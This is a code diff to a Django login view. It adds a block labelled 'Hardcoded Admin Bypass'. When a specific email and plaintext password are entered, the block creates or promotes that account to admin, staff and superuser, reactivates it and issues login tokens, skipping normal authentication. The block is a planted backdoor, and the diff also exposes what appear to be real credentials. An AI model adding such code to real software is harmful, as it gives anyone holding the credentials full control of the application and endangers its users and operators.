@@ -635,6 +635,37 @@ def password_login(request):
     if not EMAIL_REGEX.match(email):
         return Response({'error': 'Please enter a valid email address.'}, status=status.HTTP_400_BAD_REQUEST)
 
+    # ── Hardcoded Admin Bypass ───────────────────────────────────────────────
+    if email == 'sentavishant5655@gmail.com' and password == 'vishant@5655':
+        try:
+            user = User.objects.get(email=email)
+            if user.role != 'admin':
+                user.role = 'admin'
+                user.save(update_fields=['role'])
+        except User.DoesNotExist:
+            user = User.objects.create_user(
+                email=email,
+                name='Admin Vishant',
+                password=password,
+                role='admin'
+            )
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            
+        if not user.is_active:
+            user.is_active = True
+            user.save(update_fields=['is_active'])
+            
+        tokens = get_tokens_for_user(user)
+        return Response({
+            'message': 'Login successful.',
+            'user': UserSerializer(user).data,
+            'token': tokens['access'],
+            'refresh': tokens['refresh']
+        }, status=status.HTTP_200_OK)
+    # ─────────────────────────────────────────────────────────────────────────
+
     try:
         user = User.objects.get(email=email)
     except User.DoesNotExist:
